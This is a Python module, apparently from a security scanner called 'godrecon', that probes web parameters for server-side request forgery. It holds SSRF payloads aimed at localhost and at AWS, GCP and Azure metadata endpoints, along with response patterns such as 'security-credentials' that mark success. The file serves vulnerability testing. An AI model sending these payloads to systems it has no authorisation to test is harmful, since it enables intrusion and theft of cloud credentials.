"""P1 — SSRF detector."""

from __future__ import annotations

import re
from typing import Any, List

from godrecon.modules.base import Finding
from godrecon.utils.logger import get_logger

logger = get_logger(__name__)

# Internal IP targets for SSRF testing
_SSRF_TARGETS = [
    "http://127.0.0.1/",
    "http://localhost/",
    "http://169.254.169.254/latest/meta-data/",  # AWS metadata
    "http://metadata.google.internal/",  # GCP metadata
    "http://169.254.169.254/metadata/v1/",  # Azure metadata
    "http://0.0.0.0/",
    "http://[::1]/",
]

# URL-accepting parameter names
_URL_PARAMS = [
    "url", "uri", "path", "src", "source", "dest", "destination",
    "redirect", "next", "page", "file", "ref", "feed", "host",
    "proxy", "target", "link", "load", "fetch", "request",
]

# Patterns indicating internal content was returned
_INTERNAL_PATTERNS = [
    r"ami-id",
    r"instance-type",
    r"local-hostname",
    r"security-credentials",
    r"computeMetadata",
    r"metadata\.google\.internal",
    r"127\.0\.0\.1",
    r"localhost",
    r"internal",
]


class SSRFDetector:
    """Detects Server-Side Request Forgery vulnerabilities."""

    def __init__(self, http_client: Any, max_payloads: int = 5) -> None:
        self.http = http_client
        self.max_payloads = max_payloads

    async def scan(self, url: str, params: List[str]) -> List[Finding]:
        """Test URL parameters for SSRF."""
        findings: List[Finding] = []

        test_params = list(set(params + _URL_PARAMS))

        for param in test_params:
            for ssrf_url in _SSRF_TARGETS[: self.max_payloads]:
                try:
                    resp = await self.http.get(url, params={param: ssrf_url})
                    if not resp:
                        continue
                    body = resp.get("body", "") or ""
                    for pattern in _INTERNAL_PATTERNS:
                        if re.search(pattern, body, re.I):
                            finding = Finding(
                                title=f"SSRF — {url}",
                                description=(
                                    f"Parameter '{param}' makes server-side requests to "
                                    f"internal URLs. Target: {ssrf_url}"
                                ),
                                severity="critical",
                                confidence=0.9,
                                data={
                                    "url": url,
                                    "param": param,
                                    "payload": ssrf_url,
                                    "method": "GET",
                                    "type": "ssrf",
                                },
                                tags=["ssrf", "p1", "critical"],
                                evidence=f"Internal content pattern found in response: {pattern}",
                            )
                            findings.append(finding)
                            break
                except Exception as exc:
                    logger.debug("SSRF scan error: %s", exc)

        return findings
